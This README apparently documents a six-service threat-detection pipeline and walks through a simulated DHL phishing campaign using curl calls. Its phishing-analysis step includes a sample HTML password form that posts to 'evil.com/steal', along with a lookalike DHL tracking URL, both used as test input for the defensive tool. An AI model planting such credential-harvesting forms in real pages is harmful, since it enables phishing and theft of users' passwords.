# Iris Ecosystem — Full Stack Guide

Six projects that work together as a threat detection pipeline. Below is when to use each, what port it runs on, and how to run the full stack end-to-end.

## Port Map

| Project | Port | Purpose |
|---------|------|---------|
| [iris](https://github.com/makhembu/iris) | **3000** | IOC aggregation & API |
| [sentry](https://github.com/makhembu/sentry) | **3001** | Detection rule matching |
| [phishkit](https://github.com/makhembu/phishkit) | **3002** | Phishing URL analysis |
| [packetwatch](https://github.com/makhembu/packetwatch) | **3003** | Network anomaly detection |
| [trace](https://github.com/makhembu/trace) | **3004** | Incident timeline correlation |
| [nexus](https://github.com/makhembu/nexus) | **3100** | Dashboard & API gateway |

## Data Flow

```
threat feeds → iris (IOCs) → sentry (findings)
                            → phishkit (reports)  → trace (incidents) → nexus (dashboard)
                            → packetwatch (anomalies)
```

## When to Use Each

### iris (3000)
Use when you need to collect threat intelligence from open feeds, query IOCs, or get stats on what threats are trending. It's your threat intel hub — everything downstream depends on it.

### sentry (3001)
Use when you want to write YAML detection rules (like Sigma) and match them against IOCs. Sentry loads rules from `rules/*.yaml`, runs matching on demand, and stores findings. You check findings to see what rules fired.

### phishkit (3002)
Use when a user submits a suspicious URL or you find one in logs. PhishKit analyzes the URL, optional DOM, and optionally runs LLM analysis (free Zen models or Gemini Flash). Returns a phish score and indicators.

### packetwatch (3003)
Use when you want to monitor network baselines and detect anomalies. Ingest metrics from edge sensors, compute rolling baselines, and get alerts when z-scores exceed threshold. Good for spotting traffic spikes or drops.

### trace (3004)
Use when you want the big picture. Trace ingests from all four upstream projects and correlates events into incidents. If iris sees an IOC and sentry generates a finding for the same value, trace creates an incident.

### nexus (3100)
Use when you want a single pane of glass. Nexus provides a web dashboard with health indicators for all 6 services, per-card action buttons (ingest, match, analyze, detect, correlate), unified search across all projects, and structured JSON endpoints designed for AI agent consumption.

## Quick Start (threat-stack.ps1)

The unified runner at the repo root starts everything in one command:

```powershell
# Start all 6 services — builds, installs deps, copies .env, and launches in background
./threat-stack.ps1 start

# Check health of all services
./threat-stack.ps1 status

# View logs for a specific service
./threat-stack.ps1 logs -Service iris

# Stop all services
./threat-stack.ps1 stop

# Restart all services
./threat-stack.ps1 restart

# Usage help
./threat-stack.ps1 help
```

Each service writes logs to `logs/<service>.log` in the repo root. The status command checks both process liveness and HTTP `/health` endpoint.

## Manual Startup (Windows)

```powershell
# Terminal 1 - Start iris (IOC feed ingestion + API)
cd iris
cp .env.example .env
npm install
npm run build
npm start
# => http://localhost:3000

# Terminal 2 - Start sentry (detection rules + matching)
cd sentry
cp .env.example .env
npm install
npm run build
npm start
# => http://localhost:3001

# Terminal 3 - Start phishkit (phishing analysis)
cd phishkit
cp .env.example .env
npm install
npm run build
npm start
# => http://localhost:3002

# Terminal 4 - Start packetwatch (network anomaly detection)
cd packetwatch
cp .env.example .env
npm install
npm run build
npm start
# => http://localhost:3003

# Terminal 5 - Start trace (incident timeline)
cd trace
cp .env.example .env
npm install
npm run build
npm start
# => http://localhost:3004

# Terminal 6 - Start nexus (dashboard + gateway)
cd nexus
npm install
npm run build
npm start
# => http://localhost:3100
```

## Nexus Dashboard & API Gateway

Once all services are running, open http://localhost:3100 for the web dashboard.

### Gateway proxy
All service APIs are accessible through nexus at `/api/proxy/:service/*`:

```powershell
# Get iris IOCs through nexus
curl http://localhost:3100/api/proxy/iris/iocs?severity=high

# Run sentry matching through nexus
curl -X POST http://localhost:3100/api/proxy/sentry/match/run

# Analyze a URL through phishkit via nexus
curl -X POST http://localhost:3100/api/proxy/phishkit/analyze `
  -H "Content-Type: application/json" `
  -d '{"url": "https://example.com/login"}'

# Get trace incidents through nexus
curl http://localhost:3100/api/proxy/trace/incidents
```

### AI agent endpoints
Nexus provides structured JSON endpoints designed for AI agent consumption:

```powershell
# Get status of all services (machine-readable)
curl http://localhost:3100/api/ai/status

# Query across multiple services
curl -X POST http://localhost:3100/api/ai/query `
  -H "Content-Type: application/json" `
  -d '{"query":"8.8.8.8","sources":["iris","sentry","trace"],"limit":5}'

# Get executive summary across the ecosystem
curl http://localhost:3100/api/ai/summary
```

AI agent responses use `schema_version: "1.0"` and include `generated_at` timestamps for cache awareness.

### Health check
```powershell
# Aggregated health of all 5 backend services
curl http://localhost:3100/api/health
```

## End-to-End Demo: DHL Phishing Campaign

This scenario simulates a real-world DHL-themed phishing campaign and walks through all 6 tools. It demonstrates the full pipeline: threat feeds → IOCs → detection → analysis → anomalies → incidents → dashboard.

### Setup

Start all services using the unified runner (5 terminals or the single command):

```powershell
cd C:\Users\Khesh\Desktop\github
.\threat-stack.ps1 start
.\threat-stack.ps1 status   # verify all 6 show healthy
```

### Step 1 — Ingest threat feeds into iris

Pull IOCs from open threat feeds. This populates iris with known-bad domains, IPs, and hashes that may be related to phishing campaigns:

```powershell
curl -X POST http://localhost:3000/feeds/ingest
```

### Step 2 — Check iris for DHL-related IOCs

Search for IOCs mentioning "dhl" to see what the threat feeds have flagged:

```powershell
curl "http://localhost:3000/iocs?q=dhl&limit=10"
```

Expected: IOCs with type `domain` or `url` containing dhl-themed phishing indicators.

Or through the nexus gateway:

```powershell
curl "http://localhost:3100/api/proxy/iris/iocs?q=dhl&limit=10"
```

### Step 3 — Run sentry detection rules

Reload rules and run matching against the IOCs from iris:

```powershell
curl -X POST http://localhost:3001/match/run
```

### Step 4 — Check sentry findings for phishing alerts

Look for findings that fired on DHL-related phishing rules:

```powershell
curl "http://localhost:3001/findings?acknowledged=false"
```

Expected: Findings from rules like "Phishing Domain Detected" or "Brand Impersonation" with `matchedValue` containing dhl-related domains.

### Step 5 — Analyze a DHL phishing URL in phishkit

Submit a suspicious DHL-themed URL that a user reported. This simulates a real phishing email with a fake tracking link:

```powershell
curl -X POST http://localhost:3002/analyze `
  -H "Content-Type: application/json" `
  -d '{"url": "https://dhl-tracking.secure-verify.com/package?id=US1234567890"}'
```

Expected response: phish score >= 0.6, indicators detecting typosquatting (`dhl-tracking`), suspicious TLD (`.com` for a tracking page), and high URL entropy.

Optionally include the DOM for deeper analysis:

```powershell
curl -X POST http://localhost:3002/analyze `
  -H "Content-Type: application/json" `
  -d '{"url": "https://dhl-tracking.secure-verify.com/login", "dom": "<html><body><form action=\"https://evil.com/steal\" method=\"POST\"><input type=\"password\" name=\"pass\"></form></body></html>"}'
```

Expected: Additional DOM indicators — password field on a non-HTTPS form, external form action to a different domain.

### Step 6 — Ingest metrics into packetwatch

Simulate a traffic spike (phishing campaign traffic) by ingesting a metric that deviates from baseline:

```powershell
curl -X POST http://localhost:3003/metrics `
  -H "Content-Type: application/json" `
  -d '{"source": "mail_gateway", "metricType": "connection_rate", "value": 8500}'
```

Then compute baselines and run detection:

```powershell
curl -X POST http://localhost:3003/baselines/compute
curl -X POST http://localhost:3003/detect/run
```

Check for anomalies:

```powershell
curl "http://localhost:3003/anomalies?severity=high"
```

Expected: An anomaly if the connection rate deviates significantly from the baseline (z-score > 3). For a fresh database, you may see "not enough data" — ingest several metric values first to establish a baseline.

### Step 7 — Ingest everything into trace

Pull IOCs, findings, reports, and anomalies into the timeline:

```powershell
curl -X POST http://localhost:3004/ingest/all
```

### Step 8 — Correlate events into incidents

Run the correlation engine to link related events across sources:

```powershell
curl -X POST http://localhost:3004/correlate
```

### Step 9 — View incidents

Check the incidents that were created, ideally grouping DHL-related events:

```powershell
curl "http://localhost:3004/incidents?status=open"
```

Expected: An incident titled something like "DHL Phishing Campaign" that groups the iris IOC, sentry finding, phishkit report, and packetwatch anomaly.

### Step 10 — View the Nexus dashboard

Open http://localhost:3100 in a browser. You should see:
- All 6 services showing green health dots
- Stats on each card (IOC count, finding count, etc.)
- Action buttons on each card to trigger operations (ingest feeds, run match, analyze URL, add metric, create incident)
- The unified search bar to find data across all services

Or query via the AI endpoint:

```powershell
# Ask Nexus for an executive summary
curl http://localhost:3100/api/ai/summary

# Query for all DHL-related data across the ecosystem
curl -X POST http://localhost:3100/api/ai/query `
  -H "Content-Type: application/json" `
  -d '{"query":"dhl","limit":10}'

# Get structured status for an AI agent
curl http://localhost:3100/api/ai/status
```

### Tear down

```powershell
.\threat-stack.ps1 stop
```

## Testing

Each project has tests using Node's native test runner:

```bash
cd <project>
npm test
```

Or run all projects from the repo root:

```powershell
# Run all 6 test suites
foreach ($dir in @('iris','sentry','phishkit','packetwatch','trace','nexus')) { cd $dir; npm test; cd .. }
```

## Architecture Notes

- **Confidence scoring** in iris is purely deterministic: `sourceTrust (0.3) + crossSourceHits (0.3) + typeWeight (0.2) + ageFactor (0.2)`. No AI involved in IOC scoring.
- **LLM analysis** in phishkit is optional and uses free Zen API models (`big-pickle`, `nemotron-3-super-free`, `hy3-preview-free`) by default, with Gemini Flash (`gemini-2.0-flash`) as fallback. Configure via `LLM_PROVIDER` env var.
- **All projects** use Hono + better-sqlite3 locally. The same Hono API can run on Cloudflare Workers with D1 in production.
- **nexus** has no database — it's a stateless gateway that proxies to the 5 backend services. The dashboard is a single HTML page with Tailwind CDN, zero build step.
- **AI agent endpoints** (`/api/ai/*`) return structured JSON with `schema_version` and `generated_at` fields for reliable consumption.
